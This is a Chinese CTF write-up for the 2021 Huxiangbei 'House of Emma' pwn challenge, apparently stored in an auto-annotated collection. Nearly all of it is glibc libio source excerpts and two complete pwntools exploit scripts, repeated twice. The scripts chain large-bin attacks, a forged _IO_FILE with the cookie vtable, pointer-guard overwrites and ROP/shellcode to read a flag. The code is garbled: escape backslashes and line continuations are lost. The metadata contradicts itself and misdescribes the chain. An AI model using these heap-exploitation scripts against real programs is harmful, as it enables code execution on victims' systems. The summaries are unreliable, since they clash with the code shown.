---
title: 【WP】第七届"湖湘杯" House OF Emma 设计思路与解析
contest: 湖湘杯
year: 2021
difficulty: hard
vuln_type: rce
tags:
- House-of-Emma
- _IO_cookie_jumps
- _IO_cookie_file
- cookie_read_function
- cookie_write_function
- PTR_DEMANGLE
- large-bin-attack
- glibc-2.35
attack_chain: large bin attack 写 _IO_list_all + 触发 _IO_flush_all_lockp → 调 __doallocate/伪造 _IO_FILE + vtable = _IO_cookie_jumps（不被检查）/cookie_read_function = system 触发 RCE
key_payload: _IO_cookie_jumps vtable 不在检查表 +  large bin attack
one_liner: 第七届湖湘杯 House of Emma 高级 IO 攻击，利用 _IO_cookie_jumps vtable + large bin attack 绕 vtable 检查。
lesson: _IO_cookie_jumps 是 _IO_FILE_plus vtable 检查白名单外的合法 vtable；_IO_cookie_file 结构体含 cookie_read_function 指针可被劫持；large bin attack 写 _IO_list_all 是触发 _IO_flush_all_lockp 的经典手法。
quality: high
full_path: 【WP】第七届“湖湘杯”_House_OF_Emma-设计思路与解析.full.md
meta_path: 【WP】第七届“湖湘杯”_House_OF_Emma-设计思路与解析.meta.md
images_removed: true
images_removed_count: 8
schema_version: v3.0.0-P0
summary: 【WP】第七届"湖湘杯" House OF Emma 设计思路与解析。第七届湖湘杯 House of Emma 高级 IO 攻击，利用 _IO_cookie_jumps vtable + large bin attack 绕 vtable 检查。。经验：_IO_cookie_jumps 是 _IO_FILE_plus vtable 检查白名单外的合法 vtable；_IO...
category: pwn
subcategory: pwn_other
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 8
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/12959.html
reasoning_chain:
- House of Emma 是 glibc 2.35 高级 IO 攻击 → 触发点：vtable 检查新增 _IO_cookie_jumps 白名单
- 假设：vtable = _IO_cookie_jumps 不被检查 → 动作：构造 _IO_cookie_file 结构体
- _IO_cookie_file 含 cookie_read_function 指针 → 触发点：PTR_DEMANGLE 解混淆后调用
- 假设：把 cookie_read_function 写成 system + cookie='/bin/sh' → 动作：伪造 _IO_FILE + cookie 函数指针
- 触发 _IO_flush_all_lockp → 调到 fake FILE 的 __doallocate → 跳到 _IO_cookie_jumps.overflow → 调 cookie_write_function
- 如何把 fake FILE 链进 _IO_list_all → 触发点：large bin attack 写 _IO_list_all
- 动作：构造两个 large chunk，第二个比第一个大 → 触发 large bin sort → 写 _IO_list_all 为堆地址
- 观察：fake FILE 被链入 → 触发 exit/abort → 调 _IO_flush_all_lockp → 走 cookie_read_function → system('/bin/sh')
failed_attempts:
- 试图覆盖 _IO_2_1_stdout_.vtable → 失败：vtable 检查会拒绝非白名单 vtable
- 试图用 tcache poisoning 改 _IO_list_all → 失败：_IO_list_all 在 libc 数据段非堆上
- 试图 House of Orange 触发 _IO_flush_all → 失败：glibc 2.35 已修补
key_observations:
- _IO_cookie_jumps 是 vtable 检查白名单中的合法 vtable，常被绕检手法利用
- _IO_cookie_file.__io_functions.read/write 指针可被 PTR_DEMANGLE 间接调用
- large bin attack 写任意地址是 2.35 上 _IO_list_all 污染的唯一通道
- PTR_DEMANGLE 是 pointer guard 的解扰机制，需要 leak pointer guard
- House of Emma = large_bin + _IO_cookie_jumps + cookie_read_function = system 的三件套组合
prerequisites:
- glibc 2.35 IO 结构（_IO_FILE_plus / vtable 检查机制）
- large bin attack 原理（fd_nextsize/bk_nextsize 写任意值）
- PTR_DEMANGLE / pointer guard 解扰原理
- fake IO_FILE 构造（_IO_cookie_file 字段偏移）
---
# 【WP】第七届“湖湘杯” House _OF _Emma|设计思路与解析

> 原文: https://www.ctfiot.com/12959.html
> ID: 12959

static const struct _IO_jump_t _IO_cookie_jumps libio_vtable = {
 JUMP_INIT_DUMMY,
 JUMP_INIT(finish, _IO_file_finish),
 JUMP_INIT(overflow, _IO_file_overflow),
 JUMP_INIT(underflow, _IO_file_underflow),
 JUMP_INIT(uflow, _IO_default_uflow),
 JUMP_INIT(pbackfail, _IO_default_pbackfail),
 JUMP_INIT(xsputn, _IO_file_xsputn),
 JUMP_INIT(xsgetn, _IO_default_xsgetn),
 JUMP_INIT(seekoff, _IO_cookie_seekoff),
 JUMP_INIT(seekpos, _IO_default_seekpos),
 JUMP_INIT(setbuf, _IO_file_setbuf),
 JUMP_INIT(sync, _IO_file_sync),
 JUMP_INIT(doallocate, _IO_file_doallocate),
 JUMP_INIT(read, _IO_cookie_read),
 JUMP_INIT(write, _IO_cookie_write),
 JUMP_INIT(seek, _IO_cookie_seek),
 JUMP_INIT(close, _IO_cookie_close),
 JUMP_INIT(stat, _IO_default_stat),
 JUMP_INIT(showmanyc, _IO_default_showmanyc),
 JUMP_INIT(imbue, _IO_default_imbue),
};

static ssize_t
_IO_cookie_read (FILE *fp, void *buf, ssize_t size)
{
 struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
 cookie_read_function_t *read_cb = cfile->__io_functions.read;
#ifdef PTR_DEMANGLE
 PTR_DEMANGLE (read_cb);
#endif

 if (read_cb == NULL)
   return -1;

 return read_cb (cfile->__cookie, buf, size);
}

static ssize_t
_IO_cookie_write (FILE *fp, const void *buf, ssize_t size)
{
 struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
 cookie_write_function_t *write_cb = cfile->__io_functions.write;
#ifdef PTR_DEMANGLE
 PTR_DEMANGLE (write_cb);
#endif

 if (write_cb == NULL)
  {
     fp->_flags |= _IO_ERR_SEEN;
     return 0;
  }

 ssize_t n = write_cb (cfile->__cookie, buf, size);
 if (n < size)
   fp->_flags |= _IO_ERR_SEEN;

 return n;
}

static off64_t
_IO_cookie_seek (FILE *fp, off64_t offset, int dir)
{
 struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
 cookie_seek_function_t *seek_cb = cfile->__io_functions.seek;
#ifdef PTR_DEMANGLE
 PTR_DEMANGLE (seek_cb);
#endif

 return ((seek_cb == NULL
   || (seek_cb (cfile->__cookie, &offset, dir)
       == -1)
   || offset == (off64_t) -1)
  ? _IO_pos_BAD : offset);
}

static int
_IO_cookie_close (FILE *fp)
{
 struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
 cookie_close_function_t *close_cb = cfile->__io_functions.close;
#ifdef PTR_DEMANGLE
 PTR_DEMANGLE (close_cb);
#endif

 if (close_cb == NULL)
   return 0;

 return close_cb (cfile->__cookie);
}

/* Special file type for fopencookie function. */
struct _IO_cookie_file
{
 struct _IO_FILE_plus __fp;
 void *__cookie;
 cookie_io_functions_t __io_functions;
};

typedef struct _IO_cookie_io_functions_t
{
 cookie_read_function_t *read;/* Read bytes. */
 cookie_write_function_t *write;/* Write bytes. */
 cookie_seek_function_t *seek;/* Seek/tell file position. */
 cookie_close_function_t *close;/* Close file. */
} cookie_io_functions_t;

extern uintptr_t __pointer_chk_guard attribute_relro;
# define PTR_MANGLE(var) 
 (var) = (__typeof (var)) ((uintptr_t) (var) ^ __pointer_chk_guard)
# define PTR_DEMANGLE(var) PTR_MANGLE (var)

from pwn import *

context.log_level = "debug"
context.arch = "amd64"
# sh = process('./pwn')
sh = remote('127.0.0.1', 9999)
libc = ELF('./lib/libc.so.6')
all_payload = ""

def ROL(content, key):
    tmp = bin(content)[2:].rjust(64, '0')
    return int(tmp[key:] + tmp[:
key], 2)

def add(idx, size):
    global all_payload
    payload = p8(0x1)
    payload += p8(idx)
    payload += p16(size)
    all_payload += payload

def show(idx):
    global all_payload
    payload = p8(0x3)
    payload += p8(idx)
    all_payload += payload

def delete(idx):
    global all_payload
    payload = p8(0x2)
    payload += p8(idx)
    all_payload += payload

def edit(idx, buf):
    global all_payload
    payload = p8(0x4)
    payload += p8(idx)
    payload += p16(len(buf))
    payload += str(buf)
    all_payload += payload

def run_opcode():
    global all_payload
    all_payload += p8(5)
    sh.sendafter("Pls input the opcode", all_payload)
    all_payload = ""

# leak libc_base
add(0, 0x410)
add(1, 0x410)
add(2, 0x420)
add(3, 0x410)
delete(2)
add(4, 0x430)
show(2)
run_opcode()

libc_base = u64(sh.recvuntil('x7f')[-6:].ljust(8, 'x00')) - 0x1f30b0  # main_arena + 1104
log.success("libc_base:t" + hex(libc_base))
libc.address = libc_base

guard = libc_base + 0x2035f0
pop_rdi_addr = libc_base + 0x2daa2
pop_rsi_addr = libc_base + 0x37c0a
pop_rax_addr = libc_base + 0x446c0
syscall_addr = libc_base + 0x883b6
gadget_addr = libc_base + 0x146020  # mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
setcontext_addr = libc_base + 0x50bc0

# leak heapbase
edit(2, "a" * 0x10)
show(2)
run_opcode()
sh.recvuntil("a" * 0x10)
heap_base = u64(sh.recv(6).ljust(8, 'x00')) - 0x2ae0
log.success("heap_base:t" + hex(heap_base))

# largebin attack stderr
delete(0)
edit(2, p64(libc_base + 0x1f30b0) * 2 + p64(heap_base + 0x2ae0) + p64(libc.sym['stderr'] - 0x20))
add(5, 0x430)
edit(2, p64(heap_base + 0x22a0) + p64(libc_base + 0x1f30b0) + p64(heap_base + 0x22a0) * 2)
edit(0, p64(libc_base + 0x1f30b0) + p64(heap_base + 0x2ae0) * 3)
add(0, 0x410)
add(2, 0x420)
run_opcode()

# largebin attack guard
delete(2)
add(6, 0x430)
delete(0)
edit(2, p64(libc_base + 0x1f30b0) * 2 + p64(heap_base + 0x2ae0) + p64(guard - 0x20))
add(7, 0x450)
edit(2, p64(heap_base + 0x22a0) + p64(libc_base + 0x1f30b0) + p64(heap_base + 0x22a0) * 2)
edit(0, p64(libc_base + 0x1f30b0) + p64(heap_base + 0x2ae0) * 3)
add(2, 0x420)
add(0, 0x410)

# change top chunk size
delete(7)
add(8, 0x430)
edit(7, 'a' * 0x438 + p64(0x300))
run_opcode()

next_chain = 0
srop_addr = heap_base + 0x2ae0 + 0x10
fake_IO_FILE = 2 * p64(0)
fake_IO_FILE += p64(0)  # _IO_write_base = 0
fake_IO_FILE += p64(0xffffffffffffffff)  # _IO_write_ptr = 0xffffffffffffffff
fake_IO_FILE += p64(0)
fake_IO_FILE += p64(0)  # _IO_buf_base
fake_IO_FILE += p64(0)  # _IO_buf_end
fake_IO_FILE = fake_IO_FILE.ljust(0x58, 'x00')
fake_IO_FILE += p64(next_chain)  # _chain
fake_IO_FILE = fake_IO_FILE.ljust(0x78, 'x00')
fake_IO_FILE += p64(heap_base)  # _lock = writable address
fake_IO_FILE = fake_IO_FILE.ljust(0xB0, 'x00')
fake_IO_FILE += p64(0)  # _mode = 0
fake_IO_FILE = fake_IO_FILE.ljust(0xC8, 'x00')
fake_IO_FILE += p64(libc.sym['_IO_cookie_jumps'] + 0x40)  # vtable
fake_IO_FILE += p64(srop_addr)  # rdi
fake_IO_FILE += p64(0)
fake_IO_FILE += p64(ROL(gadget_addr ^ (heap_base + 0x22a0), 0x11))

fake_frame_addr = srop_addr
frame = SigreturnFrame()
frame.rdi = fake_frame_addr + 0xF8
frame.rsi = 0
frame.rdx = 0x100
frame.rsp = fake_frame_addr + 0xF8 + 0x10
frame.rip = pop_rdi_addr + 1  # : ret

rop_data = [
    pop_rax_addr,  # sys_open('flag', 0)
    2,
    syscall_addr,

    pop_rax_addr,  # sys_read(flag_fd, heap, 0x100)
    0,
    pop_rdi_addr,
    3,
    pop_rsi_addr,
    fake_frame_addr + 0x200,
    syscall_addr,

    pop_rax_addr,  # sys_write(1, heap, 0x100)
    1,
    pop_rdi_addr,
    1,
    pop_rsi_addr,
    fake_frame_addr + 0x200,
    syscall_addr
]
payload = p64(0) + p64(fake_frame_addr) + 'x00' * 0x10 + p64(setcontext_addr + 61)
payload += str(frame).ljust(0xF8, 'x00')[0x28:] + 'flag'.ljust(0x10, 'x00') + flat(rop_data)

edit(0, fake_IO_FILE)
edit(2, payload)

add(8, 0x450)  # House OF Kiwi
# gdb.attach(sh, "b _IO_cookie_write")
run_opcode()
sh.interactive()

from pwn import*
rol = lambda val, r_bits, max_bits: 
    (val << r_bits%max_bits) & (2**max_bits-1) | 
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))
ror = lambda val, r_bits, max_bits: 
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | 
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))
context.binary = './main'
def add(index,size):
    return 'x01' + chr(index) + p16(size)
def free(index):
    return 'x02' + chr(index)
def show(index):
    return 'x03' + chr(index)
def edit(index,content):
    return 'x04' + chr(index) + p16(len(content)) + content
p = process('./main')
p = remote('123.57.132.168',23774)
libc = ELF('./libc-2.34.so')
payload = add(1,0x500)
payload += add(0,0x440) #0
payload += add(1,0x500) #1
payload += add(2,0x430) #2
payload += add(3,0x500) #3
payload += add(4,0x470) #4
payload += add(5,0x500) #5
payload += add(6,0x480) #6
payload += add(7,0x500) #7
payload += free(0)
payload += free(2)
payload += show(0)
payload += show(2)
payload += 'x05'
p.sendline(payload)
libc_base = u64(p.recvuntil('x7F')[-6:].ljust(8,'x00')) - 0x1F2CC0
log.info('LIBC:t' + hex(libc_base))
p.recvuntil('Show Donen')
heap_base = u64(p.recv(6).ljust(8,'x00')) - 0x22A0 - 0x510
log.info('HEAP:t' + hex(heap_base))
payload = add(0,0x440) #0
payload += add(2,0x430) #2
payload += free(0)
payload += add(1,0x500)
payload += free(2)
payload += edit(0,p64(libc_base + 0x1F2CC0 - 0x60 + 1120)*2 + p64(heap_base + 0x2C00 + 0x510) + p64(libc_base - 0x2890 - 0x20))
payload += add(1,0x500)
payload += add(2,0x430)
payload += free(2)
payload += edit(0,p64(libc_base + 0x1F2CC0 - 0x60 + 1120)*2 + p64(heap_base + 0x2C00 + 0x510) + p64(libc_base + libc.sym['stderr'] - 0x20))
payload += add(1,0x500)
payload += add(2,0x430)
payload += free(2)
############
rand_key = heap_base + 0x27B0
fake_IO_FILE = 'x00'*0x20
fake_IO_FILE += 'x00'*0x28
fake_IO_FILE += p64(0xFFFFFFFFFFFFFFFF)
fake_IO_FILE += p64(0) + p64(libc_base + 0x1F5720) + p64(0xFFFFFFFFFFFFFFFF)
fake_IO_FILE += p64(0) + p64(libc_base + 0x1F2980)
fake_IO_FILE += 'x00'*0x18 + p64(0xFFFFFFFF) + 'x00'*0x10 + p64(libc_base + 0x1F3AE0 + 0x40)
R = rol(((libc_base + 0x00000000001482BA ) ^ rand_key), 0x11, 64)
fake_IO_FILE += p64(heap_base + 0x27B0 + 0x100) + p64(0) + p64(R) + p64(0)
fake_IO_FILE += 'x00'*0x28 + p64(libc_base + 0x52D72) +'x00'*0x18 + p64(heap_base + 0x27B0 + 0x100 + 0x50) + 'x00'*0x8 + p64(libc_base + 0x00000000001405A7) + p64(0) + p64(heap_base + 0x27B0 + 0x100) + p64(0)
pop_rdi_ret = libc_base + 0x000000000002DAA2
pop_rsi_ret = libc_base + 0x0000000000037C0A
pop_rdx_rbx = libc_base + 0x0000000000087729
fake_IO_FILE +='x00'*0x20 + p64(pop_rdi_ret) + p64(heap_base) + p64(pop_rsi_ret) + p64(0x8000) + p64(pop_rdx_rbx) + p64(7) + p64(0)
fake_IO_FILE += p64(libc_base + libc.sym['mprotect']) + p64(heap_base + 0x27B0 + 0x100 + 0x100 - 0x20)
fake_IO_FILE += asm('''
mov rax, 0x67616c662f2e ;
push rax
mov rdi, rsp ;
mov rsi, 0 ;
xor rdx, rdx ;
mov rax, 2 ;
syscall
mov rdi, rax ;
mov rsi,rsp ;
mov rdx, 1024 ;
mov rax,0 ;
syscall
mov rdi, 1 ;
mov rsi, rsp ;
mov rdx, rax ;
mov rax, 1 ;
syscall
mov rdi, 0 ;
mov rax, 60
syscall
''')
############
payload += edit(0,p64(libc_base + 0x1F2CC0 - 0x60 + 1120)*2 + p64(heap_base + 0x2C00 + 0x510) + p64(libc_base + 0x1F2CC0 - 0x20) + fake_IO_FILE)
payload += add(1,0x500)
payload += 'x05'
p.sendline(payload) 
p.interactive()

END


```
static const struct _IO_jump_t _IO_cookie_jumps libio_vtable = {
 JUMP_INIT_DUMMY,
 JUMP_INIT(finish, _IO_file_finish),
 JUMP_INIT(overflow, _IO_file_overflow),
 JUMP_INIT(underflow, _IO_file_underflow),
 JUMP_INIT(uflow, _IO_default_uflow),
 JUMP_INIT(pbackfail, _IO_default_pbackfail),
 JUMP_INIT(xsputn, _IO_file_xsputn),
 JUMP_INIT(xsgetn, _IO_default_xsgetn),
 JUMP_INIT(seekoff, _IO_cookie_seekoff),
 JUMP_INIT(seekpos, _IO_default_seekpos),
 JUMP_INIT(setbuf, _IO_file_setbuf),
 JUMP_INIT(sync, _IO_file_sync),
 JUMP_INIT(doallocate, _IO_file_doallocate),
 JUMP_INIT(read, _IO_cookie_read),
 JUMP_INIT(write, _IO_cookie_write),
 JUMP_INIT(seek, _IO_cookie_seek),
 JUMP_INIT(close, _IO_cookie_close),
 JUMP_INIT(stat, _IO_default_stat),
 JUMP_INIT(showmanyc, _IO_default_showmanyc),
 JUMP_INIT(imbue, _IO_default_imbue),
};
static ssize_t
_IO_cookie_read (FILE *fp, void *buf, ssize_t size)
{
 struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
 cookie_read_function_t *read_cb = cfile->__io_functions.read;
    #ifdef PTR_DEMANGLE
 PTR_DEMANGLE (read_cb);
    #endif

 if (read_cb == NULL)
   return -1;

 return read_cb (cfile->__cookie, buf, size);
}

static ssize_t
_IO_cookie_write (FILE *fp, const void *buf, ssize_t size)
{
 struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
 cookie_write_function_t *write_cb = cfile->__io_functions.write;
    #ifdef PTR_DEMANGLE
 PTR_DEMANGLE (write_cb);
    #endif

 if (write_cb == NULL)
  {
     fp->_flags |= _IO_ERR_SEEN;
     return 0;
  }

 ssize_t n = write_cb (cfile->__cookie, buf, size);
 if (n < size)
   fp->_flags |= _IO_ERR_SEEN;

 return n;
}

static off64_t
_IO_cookie_seek (FILE *fp, off64_t offset, int dir)
{
 struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
 cookie_seek_function_t *seek_cb = cfile->__io_functions.seek;
    #ifdef PTR_DEMANGLE
 PTR_DEMANGLE (seek_cb);
    #endif

 return ((seek_cb == NULL
   || (seek_cb (cfile->__cookie, &offset, dir)
       == -1)
   || offset == (off64_t) -1)
  ? _IO_pos_BAD : offset);
}

static int
_IO_cookie_close (FILE *fp)
{
 struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
 cookie_close_function_t *close_cb = cfile->__io_functions.close;
    #ifdef PTR_DEMANGLE
 PTR_DEMANGLE (close_cb);
    #endif

 if (close_cb == NULL)
   return 0;

 return close_cb (cfile->__cookie);
}
/* Special file type for fopencookie function. */
struct _IO_cookie_file
{
 struct _IO_FILE_plus __fp;
 void *__cookie;
 cookie_io_functions_t __io_functions;
};

typedef struct _IO_cookie_io_functions_t
{
 cookie_read_function_t *read;/* Read bytes. */
 cookie_write_function_t *write;/* Write bytes. */
 cookie_seek_function_t *seek;/* Seek/tell file position. */
 cookie_close_function_t *close;/* Close file. */
} cookie_io_functions_t;
extern uintptr_t __pointer_chk_guard attribute_relro;
# define PTR_MANGLE(var) 
 (var) = (__typeof (var)) ((uintptr_t) (var) ^ __pointer_chk_guard)
# define PTR_DEMANGLE(var) PTR_MANGLE (var)
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
# sh = process('./pwn')
sh = remote('127.0.0.1', 9999)
libc = ELF('./lib/libc.so.6')
all_payload = ""

def ROL(content, key):
    tmp = bin(content)[2:].rjust(64, '0')
    return int(tmp[key:] + tmp[:
key], 2)

def add(idx, size):
    global all_payload
    payload = p8(0x1)
    payload += p8(idx)
    payload += p16(size)
    all_payload += payload

def show(idx):
    global all_payload
    payload = p8(0x3)
    payload += p8(idx)
    all_payload += payload

def delete(idx):
    global all_payload
    payload = p8(0x2)
    payload += p8(idx)
    all_payload += payload

def edit(idx, buf):
    global all_payload
    payload = p8(0x4)
    payload += p8(idx)
    payload += p16(len(buf))
    payload += str(buf)
    all_payload += payload

def run_opcode():
    global all_payload
    all_payload += p8(5)
    sh.sendafter("Pls input the opcode", all_payload)
    all_payload = ""

# leak libc_base
add(0, 0x410)
add(1, 0x410)
add(2, 0x420)
add(3, 0x410)
delete(2)
add(4, 0x430)
show(2)
run_opcode()

libc_base = u64(sh.recvuntil('x7f')[-6:].ljust(8, 'x00')) - 0x1f30b0  # main_arena + 1104
log.success("libc_base:t" + hex(libc_base))
libc.address = libc_base

guard = libc_base + 0x2035f0
pop_rdi_addr = libc_base + 0x2daa2
pop_rsi_addr = libc_base + 0x37c0a
pop_rax_addr = libc_base + 0x446c0
syscall_addr = libc_base + 0x883b6
gadget_addr = libc_base + 0x146020  # mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
setcontext_addr = libc_base + 0x50bc0

# leak heapbase
edit(2, "a" * 0x10)
show(2)
run_opcode()
sh.recvuntil("a" * 0x10)
heap_base = u64(sh.recv(6).ljust(8, 'x00')) - 0x2ae0
log.success("heap_base:t" + hex(heap_base))

# largebin attack stderr
delete(0)
edit(2, p64(libc_base + 0x1f30b0) * 2 + p64(heap_base + 0x2ae0) + p64(libc.sym['stderr'] - 0x20))
add(5, 0x430)
edit(2, p64(heap_base + 0x22a0) + p64(libc_base + 0x1f30b0) + p64(heap_base + 0x22a0) * 2)
edit(0, p64(libc_base + 0x1f30b0) + p64(heap_base + 0x2ae0) * 3)
add(0, 0x410)
add(2, 0x420)
run_opcode()

# largebin attack guard
delete(2)
add(6, 0x430)
delete(0)
edit(2, p64(libc_base + 0x1f30b0) * 2 + p64(heap_base + 0x2ae0) + p64(guard - 0x20))
add(7, 0x450)
edit(2, p64(heap_base + 0x22a0) + p64(libc_base + 0x1f30b0) + p64(heap_base + 0x22a0) * 2)
edit(0, p64(libc_base + 0x1f30b0) + p64(heap_base + 0x2ae0) * 3)
add(2, 0x420)
add(0, 0x410)

# change top chunk size
delete(7)
add(8, 0x430)
edit(7, 'a' * 0x438 + p64(0x300))
run_opcode()

next_chain = 0
srop_addr = heap_base + 0x2ae0 + 0x10
fake_IO_FILE = 2 * p64(0)
fake_IO_FILE += p64(0)  # _IO_write_base = 0
fake_IO_FILE += p64(0xffffffffffffffff)  # _IO_write_ptr = 0xffffffffffffffff
fake_IO_FILE += p64(0)
fake_IO_FILE += p64(0)  # _IO_buf_base
fake_IO_FILE += p64(0)  # _IO_buf_end
fake_IO_FILE = fake_IO_FILE.ljust(0x58, 'x00')
fake_IO_FILE += p64(next_chain)  # _chain
fake_IO_FILE = fake_IO_FILE.ljust(0x78, 'x00')
fake_IO_FILE += p64(heap_base)  # _lock = writable address
fake_IO_FILE = fake_IO_FILE.ljust(0xB0, 'x00')
fake_IO_FILE += p64(0)  # _mode = 0
fake_IO_FILE = fake_IO_FILE.ljust(0xC8, 'x00')
fake_IO_FILE += p64(libc.sym['_IO_cookie_jumps'] + 0x40)  # vtable
fake_IO_FILE += p64(srop_addr)  # rdi
fake_IO_FILE += p64(0)
fake_IO_FILE += p64(ROL(gadget_addr ^ (heap_base + 0x22a0), 0x11))

fake_frame_addr = srop_addr
frame = SigreturnFrame()
frame.rdi = fake_frame_addr + 0xF8
frame.rsi = 0
frame.rdx = 0x100
frame.rsp = fake_frame_addr + 0xF8 + 0x10
frame.rip = pop_rdi_addr + 1  # : ret

rop_data = [
    pop_rax_addr,  # sys_open('flag', 0)
    2,
    syscall_addr,

    pop_rax_addr,  # sys_read(flag_fd, heap, 0x100)
    0,
    pop_rdi_addr,
    3,
    pop_rsi_addr,
    fake_frame_addr + 0x200,
    syscall_addr,

    pop_rax_addr,  # sys_write(1, heap, 0x100)
    1,
    pop_rdi_addr,
    1,
    pop_rsi_addr,
    fake_frame_addr + 0x200,
    syscall_addr
]
payload = p64(0) + p64(fake_frame_addr) + 'x00' * 0x10 + p64(setcontext_addr + 61)
payload += str(frame).ljust(0xF8, 'x00')[0x28:] + 'flag'.ljust(0x10, 'x00') + flat(rop_data)

edit(0, fake_IO_FILE)
edit(2, payload)

add(8, 0x450)  # House OF Kiwi
# gdb.attach(sh, "b _IO_cookie_write")
run_opcode()
sh.interactive()
from pwn import*
rol = lambda val, r_bits, max_bits: 
    (val << r_bits%max_bits) & (2**max_bits-1) | 
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))
ror = lambda val, r_bits, max_bits: 
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | 
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))
context.binary = './main'
def add(index,size):
    return 'x01' + chr(index) + p16(size)
def free(index):
    return 'x02' + chr(index)
def show(index):
    return 'x03' + chr(index)
def edit(index,content):
    return 'x04' + chr(index) + p16(len(content)) + content
p = process('./main')
p = remote('123.57.132.168',23774)
libc = ELF('./libc-2.34.so')
payload = add(1,0x500)
payload += add(0,0x440) #0
payload += add(1,0x500) #1
payload += add(2,0x430) #2
payload += add(3,0x500) #3
payload += add(4,0x470) #4
payload += add(5,0x500) #5
payload += add(6,0x480) #6
payload += add(7,0x500) #7
payload += free(0)
payload += free(2)
payload += show(0)
payload += show(2)
payload += 'x05'
p.sendline(payload)
libc_base = u64(p.recvuntil('x7F')[-6:].ljust(8,'x00')) - 0x1F2CC0
log.info('LIBC:t' + hex(libc_base))
p.recvuntil('Show Donen')
heap_base = u64(p.recv(6).ljust(8,'x00')) - 0x22A0 - 0x510
log.info('HEAP:t' + hex(heap_base))
payload = add(0,0x440) #0
payload += add(2,0x430) #2
payload += free(0)
payload += add(1,0x500)
payload += free(2)
payload += edit(0,p64(libc_base + 0x1F2CC0 - 0x60 + 1120)*2 + p64(heap_base + 0x2C00 + 0x510) + p64(libc_base - 0x2890 - 0x20))
payload += add(1,0x500)
payload += add(2,0x430)
payload += free(2)
payload += edit(0,p64(libc_base + 0x1F2CC0 - 0x60 + 1120)*2 + p64(heap_base + 0x2C00 + 0x510) + p64(libc_base + libc.sym['stderr'] - 0x20))
payload += add(1,0x500)
payload += add(2,0x430)
payload += free(2)
############
rand_key = heap_base + 0x27B0
fake_IO_FILE = 'x00'*0x20
fake_IO_FILE += 'x00'*0x28
fake_IO_FILE += p64(0xFFFFFFFFFFFFFFFF)
fake_IO_FILE += p64(0) + p64(libc_base + 0x1F5720) + p64(0xFFFFFFFFFFFFFFFF)
fake_IO_FILE += p64(0) + p64(libc_base + 0x1F2980)
fake_IO_FILE += 'x00'*0x18 + p64(0xFFFFFFFF) + 'x00'*0x10 + p64(libc_base + 0x1F3AE0 + 0x40)
R = rol(((libc_base + 0x00000000001482BA ) ^ rand_key), 0x11, 64)
fake_IO_FILE += p64(heap_base + 0x27B0 + 0x100) + p64(0) + p64(R) + p64(0)
fake_IO_FILE += 'x00'*0x28 + p64(libc_base + 0x52D72) +'x00'*0x18 + p64(heap_base + 0x27B0 + 0x100 + 0x50) + 'x00'*0x8 + p64(libc_base + 0x00000000001405A7) + p64(0) + p64(heap_base + 0x27B0 + 0x100) + p64(0)
pop_rdi_ret = libc_base + 0x000000000002DAA2
pop_rsi_ret = libc_base + 0x0000000000037C0A
pop_rdx_rbx = libc_base + 0x0000000000087729
fake_IO_FILE +='x00'*0x20 + p64(pop_rdi_ret) + p64(heap_base) + p64(pop_rsi_ret) + p64(0x8000) + p64(pop_rdx_rbx) + p64(7) + p64(0)
fake_IO_FILE += p64(libc_base + libc.sym['mprotect']) + p64(heap_base + 0x27B0 + 0x100 + 0x100 - 0x20)
fake_IO_FILE += asm('''
mov rax, 0x67616c662f2e ;
push rax
mov rdi, rsp ;
mov rsi, 0 ;
xor rdx, rdx ;
mov rax, 2 ;
syscall
mov rdi, rax ;
mov rsi,rsp ;
mov rdx, 1024 ;
mov rax,0 ;
syscall
mov rdi, 1 ;
mov rsi, rsp ;
mov rdx, rax ;
mov rax, 1 ;
syscall
mov rdi, 0 ;
mov rax, 60
syscall
''')
############
payload += edit(0,p64(libc_base + 0x1F2CC0 - 0x60 + 1120)*2 + p64(heap_base + 0x2C00 + 0x510) + p64(libc_base + 0x1F2CC0 - 0x20) + fake_IO_FILE)
payload += add(1,0x500)
payload += 'x05'
p.sendline(payload) 
p.interactive()
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]